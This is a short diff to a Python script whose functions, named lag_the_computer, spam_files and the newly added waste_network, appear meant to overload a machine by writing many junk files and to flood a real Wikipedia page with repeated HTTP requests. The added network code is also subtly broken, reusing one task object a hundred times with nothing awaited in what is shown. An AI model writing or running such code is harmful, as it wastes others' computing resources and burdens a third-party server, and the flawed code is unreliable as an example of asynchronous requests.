@@ -1,4 +1,6 @@
 import multiprocessing
+import asyncio
+import aiohttp
 from concurrent.futures import ThreadPoolExecutor
 
 def lag_the_computer(num):
@@ -11,6 +13,10 @@ def spam_files(num):
     for i in range(1, 101):
         with open(f'file{num}_{i}.txt', 'w') as f:
             f.write(f'Number: {num}')
+            
+async def waste_network():
+    async with aiohttp.ClientSession() as session:
+        tasks = [asyncio.create_task(session.get('https://en.wikipedia.org/Georgia_Institute_of_Technology'))] * 100
             
 def main():
     with ThreadPoolExecutor() as executor:
